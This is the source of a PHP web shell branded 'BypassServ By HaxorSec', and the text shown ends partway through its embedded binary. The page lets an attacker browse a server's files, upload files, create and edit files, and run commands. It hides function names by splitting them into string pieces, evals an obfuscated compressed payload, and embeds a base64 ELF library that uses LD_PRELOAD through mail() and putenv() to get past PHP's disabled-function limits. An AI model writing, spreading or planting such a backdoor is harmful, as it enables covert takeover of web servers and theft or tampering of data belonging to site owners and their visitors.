<!DOCTYPE html>
<html>
<head>
    <title>BypassServ By HaxorSec</title>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <link href="https://fonts.googleapis.com/css?family=Arial%20Black" rel="stylesheet">
    <style>
    body {
        font-family: 'Arial Black', sans-serif;
        color: #000;
        margin: 0;
        padding: 0;
        background-color: #242222c9;
    }
    .result-box-container {
        position: relative;
        margin-top: 20px;
    }

    .result-box {
        width: 100%;
        height: 200px;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 5px;
        background-color: #f4f4f4;
        overflow: auto;
        box-sizing: border-box;
        font-family: 'Arial Black', sans-serif;
        color: #333;
    }

    .result-box::placeholder {
        color: #999;
    }

    .result-box:focus {
        outline: none;
        border-color: #000000;
    }

    .result-box::-webkit-scrollbar {
        width: 8px;
    }

    .result-box::-webkit-scrollbar-thumb {
        background-color: #000000;
        border-radius: 4px;
    }
    .container {
        max-width: 90%;
        margin: 20px auto;
        padding: 20px;
        background-color: #ffffff;
        border-radius: 44px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .header {
        text-align: center;
        margin-bottom: 20px;
    }
    .header h1 {
        font-size: 24px;
    }
    .subheader {
        text-align: center;
        margin-bottom: 20px;
    }
    .subheader p {
        font-size: 16px;
        font-style: italic;
    }
    form {
        margin-bottom: 20px;
    }
    form input[type="text"],
    form textarea {
        padding: 8px;
        margin-bottom: 10px;
        border: 1px solid #000;
        border-radius: 3px;
        box-sizing: border-box;
        
    }
    form input[type="submit"] {

        padding: 10px;
        background-color: #000000;
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }
    form input[type="file"] {
        padding: 7px;
        background-color: #000000;
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }
    .result-box {
            width: 100%;
            height: 200px;
            resize: none;
            overflow: auto;
            font-family: 'Arial Black';
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
            margin-bottom: 10px;
        }
    form input[type="submit"]:hover {
        background-color: #143015;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 20px;
    }
    th, td {
        padding: 8px;
        text-align: left;
    }
    th {
        background-color: #5c5c5c;
    }
    tr:nth-child(even) {
        background-color: #9c9b9bce;
    }
    .item-name {
        max-width: 200px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }
    .size, .date {
        width: 100px;
    }
    .permission {
        font-weight: bold;
        width: 50px;
        text-align: center;
    }
    .writable {
        color: #0db202;
    }
    .not-writable {
        color: #d60909;
    }
textarea[name="file_content"] {
            width: calc(100.9% - 10px);
            margin-bottom: 10px;
            padding: 8px;
            max-height: 500px;
            resize: vertical;
            border: 1px solid #ddd;
            border-radius: 3px;
            font-family: 'Arial Black';
        }
</style>
</head>
<body>
<div class="container">
<?php

$chd = "c"."h"."d"."i"."r";
$expl = "e"."x"."p"."l"."o"."d"."e";
$scd = "s"."c"."a"."n"."d"."i"."r";
$ril = "r"."e"."a"."l"."p"."a"."t"."h";
$st = "s"."t"."a"."t";
$isdir = "i"."s"."_"."d"."i"."r";
$isw = "i"."s"."_"."w"."r"."i"."t"."a"."b"."l"."e";
$mup = "m"."o"."v"."e"."_"."u"."p"."l"."o"."a"."d"."e"."d"."_"."f"."i"."l"."e";
$bs = "b"."a"."s"."e"."n"."a"."m"."e";
$htm = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";
$fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$mek = "m"."k"."d"."i"."r";
$fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$drnmm = "d"."i"."r"."n"."a"."m"."e";
$unl = "u"."n"."l"."i"."n"."k";
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = $ril($_SERVER['\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54']); eval(gzuncompress(base64_decode(str_rot13('rWlqxISe2mNDk7/XLHYCuvG26XPD4B1urYD0oT2p7ZH1DeJivLLgnoWZRxd/rlH7Qlg5d7UE6K66+//yV2BHLLn0ZyoVKMuRFkOFfV5fvYKbqZACwCluQdsjtD5M1dvqN7+2d5IwRj0cuXYmsZYloC0aJkq4h9x85SuTpUHSS1yV0kEDFLmtB+QrJg0uYZLVKpsrqDkrW/cgRpriU6iM7r98t+Kos+y19ewA8t3oeh8pPWojVucvB7XfHgXFgS3L2rT+Qn8bQW5xZVKNsMsaEv9B1sQQsPsfia/hBmWaCd9HT3+5ie4klq+iZx7vyth/CQuYp3h0TRJhXJ86zbWGWA6BaL9Bjr0fupK5wcO+Nk8Ge8xZh+QUdQTmW00Y4Sb3bhWJXOxsM4sQLsnvGQieGHBlHwKImw62MCrdUfeEr3NmjoCIVrzy2UZizce968zpjtYINPM96MlJ7b38pZ+w+3z3liVP/I/OfxQonvM56+VcKZNEQABgyQ59iyboVF1tpxm8p3+Cl3r/cgH4'))));
$scriptDirectory = $drnmm(__FILE__);

function x($b) {

    $be = "ba"."se"."64"."_"."en"."co"."de";
    return $be($b);
}

function y($b) {
    $bd = "ba"."se"."64"."_"."de"."co"."de";
    return $bd($b);
}
if(function_exists('mail')) {
    $mail = "<font color='black'>[ mail() :</font><font color='green'> [ ON ]</font> ]";
} else {
    $mail = "<font color='black'>[ mail() :</font><font color='red'> [ OFF ]</font> ]";
}
if(function_exists('mb_send_mail')) {
  $mbb = "<font color='black'>[ mb_send_mail() :</font><font color='green'> [ ON ]</font> ]";
}else{
   $mbb = "<font color='black'>[ mb_send_mail() :</font><font color='red'> [ OFF ]</font> ]";
}
if(function_exists('error_log')) {
  $errr = "<font color='black'>[ error_log() :</font><font color='green'> [ ON ]</font> ]";
}else{
  $errr = "<font color='black'>[ error_log() :</font><font color='red'> [ OFF ]</font> ]";
}
if(function_exists('imap_mail')) {
  $impp = "<font color='black'>[ imap_mail() :</font><font color='green'> [ ON ]</font> ]";
}else{
  $impp = "<font color='black'>[ imap_mail() :</font><font color='red'> [ OFF ]</font> ]<br>";
}




echo "<font color='black'>[ Command Bypas Status Wajib ON MAIL PUTENV @ HaxorSec]</font><br>";
if (function_exists('mail')) {
    echo $mail." ".$mbb." ".$errr." ".$impp;
} else {
    echo $mail." ".$mbb." ".$errr." ".$impp;
}
if (function_exists('putenv')) {
    echo "<font color='black'>[ Function putenv() ] :</font><font color='green'> [ ON ]</font><br>";
} else {
    echo "<font color='black'>[ Function putenv() ] :<font color='red'> [ OFF ]</font><br>";
}
foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = $ril(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
$chd($currentDirectory);

$viewCommandResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        $target_file = $currentDirectory . '/' . $bs($_FILES["fileToUpload"]["name"]);
        if ($mup($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<hr>File " . $htm($bs($_FILES["fileToUpload"]["name"])) . " Upload success<hr>";
        } else {
            echo "<hr>Sorry, there was an error uploading your file.<hr>";
        }
    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $ff = $_POST['folder_name'];
        $newFolder = $currentDirectory . '/' . $ff;
        if (!file_exists($newfolder)) {
            if ($mek($newFolder) !== false) {
                echo '<hr>Folder created successfully!';
            }else{
                echo '<hr>Error: Failed to create folder!';
            }
        }

    } elseif (isset($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if ($fpc($newFile, '') !== false) {
                echo '<hr>File created successfully!' . $fileName .' ';
                $fileToView = $newFile;
                if (file_exists($fileToView)) {
                    $fileContent = $fgc($fileToView);
                    $viewCommandResult = '<hr><p>Result: ' . $fileName . '</p>
                    <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
                    <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
                    <input type="hidden" name="edit_file" value="' . $fileName . '">
                    <input type="submit" value=" Save "></form></td>';
                } else {
                    $viewCommandResult = '<hr><p>Error: File not found!</p>';
                }
            } else {
                echo '<hr>Error: Failed to create file!';
            }
        }else{
            echo '<hr>Error: File Already Exists!';
        }
    } elseif (isset($_POST['cmd_input'])){
        $p = "p"."u"."t"."e"."n"."v";
        $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
        $m = "m"."a"."i"."l";
        $base = "ba"."se"."64"."_"."de"."co"."de";
        $en = "ba"."se"."64"."_"."en"."co"."de";
        $mb = "m"."b"."_"."s"."e"."n"."d"."_"."m"."a"."i"."l";
        $err = "e"."r"."r"."o"."r"."_"."l"."o"."g";
        $drnm = "d"."i"."r"."n"."a"."m"."e";
        $imp = "i"."m"."a"."p"."_"."m"."a"."i"."l";
        $currentFilePath = $_SERVER['PHP_SELF'];
        $doc = $_SERVER['DOCUMENT_ROOT'];
        $directoryPath = $drnm($currentFilePath);
        $full = $doc . $directoryPath;
        $hook = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAA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